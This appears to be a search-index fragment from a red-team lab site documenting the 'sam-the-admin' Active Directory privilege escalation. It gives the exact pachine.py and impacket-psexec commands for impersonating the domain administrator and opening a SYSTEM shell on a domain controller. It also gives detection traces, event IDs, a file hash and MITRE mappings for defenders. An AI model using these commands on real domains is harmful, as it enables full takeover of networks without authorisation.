impacket","title":"Installation"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin/#docker","text":"A docker image has been provided which includes the following tools: Impacket in the /opt -directory Pachine in the /opt -directory SSH Proxychains","title":"Docker"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin/#firing-up-the-docker-container","text":"A dockerfile has been provided in the repository. Using it, build the image and run the container by running command # 1. go to directory with the dockerfile # 2. Build the Docker image, name it with arg specified with -t $docker build . -t my_container_name # 3. Run the container and open a shell there. $docker run -it my_container_name \"/bin/bash\" # 4. Carry out the mandatory configuration of the file /etc/hosts (instructions below)","title":"Firing up the Docker container"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin/#mandatory-configurations-inside-the-container","text":"Add entry of DC's IP-address to /etc/hosts : <DC_IP> dc.rt.vle.fi rt.vle.fi","title":"Mandatory configurations inside the container"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin/#attack-steps","text":"Use pachine.py (found in cloned Pachine directory) to check if the machine is vulnerable. $python3 pachine.py -dc-host [DC FQDN] -scan \"[DOMAIN]/[USERNAME:PW]\" Using pachine.py , acquire administrator's Kerberos ticket. This ticket is saved for a .ccache file in the current directory. $python3 pachine.py -dc-host [DC FQDN] -spn cifs/[DOMAIN] -impersonate administrator '[DOMAIN]/[USERNAME]:[PW]' Export path of the .ccache file to an environmental variable called KRB5CCNAME . Check the local directory for the file if needed. After the export valid Kerberos tickets can be checked. $export KRB5CCNAME=$PWD/[CCACHE_FILE_NAME] $klist NOTE: If you use auto-completion (TAB) to fill the ccache filename into the export command, terminal may automatically escape the dollar sign in $PWD . Make sure the dollar sign is not escaped. Open a shell on the DC as user \"system\" with the following command: $impacket-psexec -k -no-pass [DOMAIN]/administrator@[DOMAIN] Enjoy!","title":"Attack steps"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin/#for-blue-teams","text":"The attack leaves traces in Windows event logs, Windows Active Directory and most likely to the ADMIN$ share of the domain controller.","title":"For blue teams"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin/#attack-traces","text":"Traces were mapped to attack procedures whenever possible. Listed attacker procedures might not be separate manual actions carried out by the attacker. Listed procedures can be smaller actions induced by a single command executed by the attacker.","title":"Attack traces"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin/#step-1-pachinepy-scan","text":"During the first step the attacker scans the domain controller for vulnerability. The table below shows the attack procedures during the first of the attack in terms of their respective traces and their source/ location. Attack procedure Trace type / location IoC / trace Additional info Request TGT without a PAC for regular user X Windows Event Log Kerberos TGT Request, Event 4768 Differs from \"normal\" TGT request by requesting a ticket specifically without PAC Request TGT with a PAC for regular user X Windows Event Log Kerberos TGT Request, Event 4768 Normal TGT request, hard to distinguish from bad actions","title":"Step 1 - Pachine.py, scan"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin/#step-2-exploitation-admin-impersonation","text":"Attackers can use regular user's credentials to add a machine account to the domain. A series of other procedures are executed to induce the DC to yield a TGS for Administrator user. Actions before administrative access are executed as regular user X (victim). Attack procedure Trace source / location IoC / trace Additional info Add new machine account named \"\" dc \"\" to the domain Windows Event Log / DC Machine Account Creation, Event 4741 EventData contains TargetUserName \"dc\", note: The machine account name doesn't end with $ Request TGT for machine account \"dc\" Windows Event Log / DC Kerberos TGT Request, Event 4768 EventData contains TargetUserName \"dc\" Change machine account name \"dc\" to \"DESKTOP-NNNNNNNN$\" Windows Event Log / DC Machine account name changed, Event 4781 EventData contains OldTargetUserName \"dc\" Request TGS for machine account \"dc\" using S4U2Self functionality Windows Event Log / DC Kerberos TGS Request, Event 4769 EventData contains TargetUserName \"dc@\" + DOMAIN_NAME Change server name from dc@DOMAIN to cifs/DOMAIN@DOMAIN UNK ? - Change machine account name \"DESKTOP-NNNNNNNN$\" to \"dc\" Windows Event Log Machine account name changed, Event 4781 EventData contains NewTargetUserName \"dc\" and OldTargetUserName \"DESKTOP-NNNNNNNN\\$\". Note: Each N in machine name \"DESKTOP-NNNNNNNN$\" stands for a randomly generated character by the attacker. The figure below demonstrates a situation where the attacker has added a machine \"dc\" to domain. Note the missing $ in machine's name. In the figure below the attacker has renamed DESKOP-NNNNNNNN$ back to dc .","title":"Step 2 - Exploitation, Admin  Impersonation"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin/#step-3-exporting-krb5ccname-to-env-vars","text":"No attacker actions which would leave traces to target system or network.","title":"Step 3 - Exporting KRB5CCNAME to env. vars"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin/#step-4-impacket-psexec","text":"The attacker uploads a randomly named RemComSvc utility binary to the target machine's writable share via SMB and creates a service. The length of the random named executable is approximately 7 to 9 characters (excluding the .exe extension). The service's name is typically 4 charaters long. Attack procedure Trace source / location IoC / trace Additional info Shares requested on target IP UNK UNK - Upload .exe to share Propable file artifact / C:\\Windows\\ .exe / DC Executable with MD5sum: 6983f7001de10f4d19fc2d794c3eb534 , may get deleted if the attacker's shell session exits gracefully Located very likely under C:\\Windows\\ , share used for access very likely ADMIN$ , File checksum is a certain IoC Create service to execute .exe Windows Event Log / DC Service Control Manager, Event 7045 ( event 7045 is a \"legacy\" version of Event 4697 ) Announcement of a new created service (NNNN) Start the service to execute .exe Windows Event Log / DC Service Control Manager, Event 7036 ] Announcement of the (attacker's) service (NNNN) having entered running state","title":"Step 4 - Impacket PsExec"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin/#edr-detection","text":"This exploit was tested against Windows Server 2012 with FireEye Endpoint Security Client, version 33.46.6. FireEye did not detect the attack. FireEye EDR did not generate alerts on the EDR service in the Labranet RT environment.","title":"EDR detection"},{"location":"7-privilege-escalation/sam-the-admin/sam-the-admin/#cwe-and-mitre-attck","text":"CWE-269: Improper Privilege Management TA0001 - Initial access: T1078 - Valid accounts * Attacker needs a valid account on the domain to execute the attack. TA0003 - Persistence T1078 - Valid accounts * The attacker can maintain access to network resources through the compromised or newly created accounts. TA0004 - Privilege escalation T1134 - Access token manipulation * By exploiting the vulnerability, attackers can create TGS for any user in the domain to the CIFS service (If the victim is assigned to that service). Gaining access to the CIFS service allows attackers to access domain controller's network shares as domain administrator. T1078 - Valid accounts * The attacker gains access to a valid account on the domain. TA0006 - Credential access T1558 - Steal or forge kerberos tickets * The attacker can request the administrator's ticket because of account name handling on the Key Distribution Center.","title":"CWE and MITRE ATT&amp;CK"}]}